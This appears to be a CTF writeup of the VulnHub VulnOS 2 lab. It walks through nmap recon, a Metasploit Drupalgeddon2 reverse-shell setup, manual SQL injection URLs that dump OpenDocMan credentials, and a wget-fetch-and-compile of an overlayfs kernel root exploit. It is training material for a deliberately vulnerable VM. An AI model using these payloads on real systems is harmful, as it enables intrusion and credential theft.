---
layout: default
---

# VulnHub - VulnOS 2 writeup 

![Header image](/assets/images/vh_vulnos2/vulnos2_header.png)

[VulnHub image link](https://www.vulnhub.com/entry/vulnos-2,147/)

:ghost: :shell:

## Introduction 

> "VulnOS are a series of vulnerable operating systems packed as virtual images to enhance penetration testing skills."
> "Your assignment is to pentest a company website, get root of the system and read the final flag"

This system is quite fun as it can be breached in a few different ways. Also the web application is themed to a great anime series called [Ghost In the Shell](https://en.wikipedia.org/wiki/Ghost_in_the_Shell)

## Initial recon

### Nmap scan

Lets start enumerating this system with a fast (-T4) aggressive (-A) very verbose (-vv) nmap TCP SYN scan of all ports (-p-) and output it to all formats (-oA).
```
sudo nmap 192.168.56.104 -A -T4 -vv -p- -oA tcp_all_agg_fast
```

Lets also conduct a quick UDP version scan of the top 1000 UDP ports.
```
nmap 192.168.56.104 -sUV -vv -oA udp_top1000_ver 
```

#### TCP Scan Results
```
# Nmap 7.80 scan initiated Wed Jul 29 14:02:19 2020 as: nmap -A -T4 -vv -p- -oA tcp_all_agg_fast 192.168.56.104
Nmap scan report for 192.168.56.104
Host is up, received arp-response (0.00084s latency).
Scanned at 2020-07-29 14:02:20 EDT for 23s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAORRAsDcJJtkwMruX4yXojqiox8ni/JHNX/zgwtmPcfLkENKY5bYD1dMpASvE0K9Gh5Mo4U/yycRK9xHGLMssBBr5F8QOq8I66Ee7kOG+CJzT+g5Fhl+0R5pI2+kEGSipf+mL1A1HA9JYm87rNWkG3mI5cS4J2okX2CMZGPYucflAAAAFQCdR4coK0rgndw4wMd7SCCewTd5QQAAAIBGnb2CKZQhnmy7G/Dublt921HOMTOb3jXJugIp/Q0g9sQEkYQoEEXOS5+kDVODt7C1rgZQzvY4eX2gnEcW38esIIYVX5j54bV7RpcYTs+3onSvpLJJJudFOF8jS/J53DeiQ9sS68bCDi1K7h7f5dLeaemKJz8j42/8mdUpEZ+xHAAAAIBXyrkDziSMSuaCSxkfwFMzlqFWNI5EszgByhcHsuNYhrRryrZkC/Jq7ypWv2vt1zlkem9z/l5eX7gxwhckbQgPHqKxtmfznzoosQ0EoHAnG+bO7VXDM1yFl5xCXBLFvFlE6QjYJBcrtz9jeAJHUlyXAYIrSthz6y4OCc0rGAxC+g==
|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDpuBQNKY6U8FF+8yJgjCqn0f9MJ1rCgGLo2HdvhWvbgyOxmvf4mg47Oi4OWjpD7oiiaawPLFJfUPhBl7CVLLnMQxM6MDdmJP1qSl6slA52KB9Qt8hvPiatY9yF2UzTQ+riP9g2n6D9QQruSVQQFsKUeJvte2X7EApMmmXSQ1L/Qziio1mFu4tvqckMsfdjlYnFSRSdKoorT/7/Vw0sBUzDNsSsGq8tA3rqGOKmj3JdS0H0FGEciLFyIx9/rLC2bHc03l2V08Y8MozB3TQTcO6lvxpFgSAEPmNglCAMSZOIFmdIvpmi5FfHsVuP6O94twetVHq0CyvihY8SoXQoiqib
|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMTthIC3/w1NQVyFFPrMh63/cVUWJylryc7v9Whbab9DKivYIWxffvI6HJpjeMm63ChJV9HjkbtGBbKhnNeRJ64=
|   256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMx/VEravl9aUxne0KuM0Eexc8iu9sMLlyKfDQJ7XIn4
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnOSv2
6667/tcp open  irc     syn-ack ttl 64 ngircd
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/29%OT=22%CT=1%CU=42849%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=5F21B9C4%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 0.002 days (since Wed Jul 29 14:00:34 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.84 ms 192.168.56.104

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 29 14:02:44 2020 -- 1 IP address (1 host up) scanned in 25.26 seconds
```

There are only two open TCP ports on this system. 
* Port 22 (SSH) running OpenSSH 6.6.1p1
* Port 80 (HTTP Web Server) Apache httpd 2.4.7

The port banners also reveal that its an Ubuntu system and the OS scan also confirms this and reveals that its Linux version 3.x

#### UDP Scan Results

```
# Nmap 7.80 scan initiated Wed Jul 29 14:05:22 2020 as: nmap -sUV -vv -oA udp_top1000_ver 192.168.56.104
Increasing send delay for 192.168.56.104 from 50 to 100 due to 11 out of 14 dropped probes since last increase.
Nmap scan report for 192.168.56.104
Host is up, received arp-response (0.00079s latency).
Scanned at 2020-07-29 14:05:23 EDT for 1190s
Not shown: 999 closed ports
Reason: 999 port-unreaches
PORT   STATE         SERVICE REASON      VERSION
68/udp open|filtered dhcpc   no-response
MAC Address: 08:00:27:57:4F:AA (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 29 14:25:14 2020 -- 1 IP address (1 host up) scanned in 1191.44 seconds
```

Nothing interesting and out of the ordinary for the UDP ports.

## Web Enumeration

Lets start our enumeration by examining whats running on the web server.

The web root directs us to the following webpage (/jabc) hosted on the Apache Web server.

![JABC Website](/assets/images/vh_vulnos2/vh_vulnos_website_1.jpg)

If you inspect the pages source code and search for the word **generator** you can normally find what the website was generated with. In this case it appears the website is made using **Drupal 7**.

![JABC index source code](/assets/images/vh_vulnos2/vh_vulnos_website_2.jpg)

If you run a gobuster directory scan it will also reveal a few directories that indicate its a drupal website.
```
sudo gobuster dir -u http://192.168.56.104/jabc/ -w /usr/share/dirb/wordlists/common.txt -t 10 -o gobuster_scan.txt
```

Here are the gobuster scan results
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.104/jabc/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/08/01 11:21:57 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/includes (Status: 301)
/index.php (Status: 200)
/misc (Status: 301)
/modules (Status: 301)
/profiles (Status: 301)
/robots.txt (Status: 200)
/scripts (Status: 301)
/sites (Status: 301)
/templates (Status: 301)
/themes (Status: 301)
/xmlrpc.php (Status: 200)
===============================================================
2020/08/01 11:21:58 Finished
===============================================================
```

### Drupal Metasploit Exploit Module

If you search for **drupal 7** on exploit-db.com there are quite a few vulnerabilities for drupal. In particular we see there are a few Metasploit modules available.
Search for **drupal** in Metasploit Framework console and you will notice a few that are ranked excellent.

This one appears to work without the need for Authentication and gives us a shell on the system.

```
exploit/unix/webapp/drupal_drupalgeddon2 
```

![Drupal Metasploit Module](/assets/images/vh_vulnos2/vh_vulnos_drupal_msf_exploit_1.jpg)

Set the RHOSTS, TARGETURI and LHOST to the appropriate values.

```
# Set to target system IP address
set RHOSTS 192.168.56.104

# Set to Drupal Site root directory address
set TARGETURI /jabc/

# Set to your IP address so the payload connects back
set LHOST 192.168.56.102

exploit
```

![Drupal Metasploit Module](/assets/images/vh_vulnos2/vh_vulnos_drupal_msf_exploit_2.jpg)

We now have a shell a **www-data** user on the system.

There is another way we can get a shell on the system described below.

### OpenDocMan Exploit

If we navigate to the Documentation section of the website there appears to be nothing there, however if you inspect the pages source code you can see that the section is hidden on purpose and directs us to a new URL **/jabcd0cs** on the server and that we should login with **guest/guest** credentials.

![JABC Documents hidden section](/assets/images/vh_vulnos2/vh_vulnos_documents_1.jpg)

Visiting the **/jabcd0cs** directory on the web server we can see that it is a running **OpenDocMan v1.2.7**.

![OpenDocMan](/assets/images/vh_vulnos2/vh_vulnos_opendocman_1.jpg)

Checking exploit-db.com for vulnerabilities for OpenDocMan v1.2.7 we find this link stating multiple vulnerabilities for the exact version we have.
On oe which is an SQL injection vulnerability and the other allows us to escalate our privileges to admin on the web application.

[OpenDocMan 1.2.7 - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/32075)

#### SQL Injection

```
High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in OpenDocMan, which can be exploited to perform SQL Injection and gain administrative access to the application.

1) SQL Injection in OpenDocMan: CVE-2014-1945

The vulnerability exists due to insufficient validation of "add_value" HTTP GET parameter in "/ajax_udf.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application's database.

The exploitation example below displays version of the MySQL server:

http://[host]/ajax_udf.php?q=1&add_value=odm_user"http://192.168.56.105/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user
```

You could use sqlmap to automatically SQL inject the above URL path but lets do it manually.

```
sqlmap --url "http://192.168.56.105/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user*" --threads 10 -dbs 
```

This is our base injection parameter
```
"http://192.168.56.105/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user
```

Lets start by first enumerating the where our output will be displayed.
```
http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,2,3,4,5,6,7,8,9
```
From the output above it appears column 2 displays our output on the page

Lets get a list of all the databases on the server by selecting the schema_name from the information_schema.schemata table
```
http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,schema_name,3,4,5,6,7,8,9%20FROM%20information_schema.schemata
```
![SQL Injection database enumeration](/assets/images/vh_vulnos2/vh_vulnos_opendocman_sqli_1.jpg)

This will get the current database name which is **jabd0cs**
```
http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,database(),3,4,5,6,7,8,9
```

Get all tables names for current database.
```
http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,table_name,3,4,5,6,7,8,9%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20database()
```

The **odm_users** table looks interesting lets get its column names. I used 11 as a separator between the table_name and column name as quote or double quotes does not work to insert a string between them.
```
http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,concat(table_name,%2011%20,column_name),3,4,5,6,7,8,9%20FROM%20information_schema.columns%20WHERE%20table_schema%20=%20database()
```
![Tables and columns](/assets/images/vh_vulnos2/vh_vulnos_opendocman_sqli_2.jpg)

The username and password column look interesting for the odm_users tables, lets see if we can see those values now.
```
http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,concat(username,%2011%20,password),3,4,5,6,7,8,9%20FROM%20odm_user
```

![Usernames and Passwords](/assets/images/vh_vulnos2/vh_vulnos_opendocman_sqli_3.jpg)

Looks like we found some usernames and passwords. hash-identifier identifies it as an MD5 hash. We can use an online MD5 hash cracker like [hashes.com](https://hashes.com/en/decrypt/hash) to crack our MD5 hash.

![Cracking MD5 Hash](/assets/images/vh_vulnos2/vh_vulnos_cracked_hash.jpg)

Now lets try to see if we can SSH into the box using our newly found credentials. Looks like it works!

![SSH access](/assets/images/vh_vulnos2/vh_vulnos_ssh_access.jpg)

## Privilege Escalation

Time to get root.

Get linpeas script onto the target system using wget and modify its permissions so that it can execute.

![Linpeas Scan](/assets/images/vh_vulnos2/vh_vulnos_linpeas.jpg)

As you can see LinPEAS is highlighting the Linux version as a 99% privilege escalation vector.

> Linux version 3.13.0-24-generic (buildd@komainu) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014

Checking exploit-db.com for Linux 3.13 we find a few Kernel exploits.

This one seems to match our Linux Kernel version 3.13 and Ubuntu distribution version (14.04)

[Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation](https://www.exploit-db.com/exploits/37292)

Download the exploit from above. 
```
wget https://www.exploit-db.com/download/37292 -O ofs_exploit.c
```

Start up a simple python web server on your attacking machine to host the exploit file for download.
```
sudo python3 -m http.server 80
```

Download the exploit to the target system using wget
```
wget http://192.168.56.102/ofs_exploit.com
```

Compile the exploit using gcc and then execute it to get root.
```
gcc ofs_exploit.c -o ofs
./ofs
```

![Kernel Exploit](/assets/images/vh_vulnos2/vh_vulnos_kernel_exploit.jpg)

Boom we have root!

**Note** - there is another way to root which is more complicated, it involves enumerating the the odd postgresql database on the system and then finding user credentials within it. Once you have those credentials you can enumerate the machine further to find a blender file which when you open and edit it you will find the password for root.

## Summary

Overall this machine was relatively easy as there were two ways to get an initial shell and also two ways to gain root access, each involved a different exploit path.

## Notes
Check this WriteUp out on how to find the roots password via postgresql and blender.

https://g0blin.co.uk/vulnos-2-vulnhub-writeup/

## References

https://en.wikipedia.org/wiki/Ghost_in_the_Shell

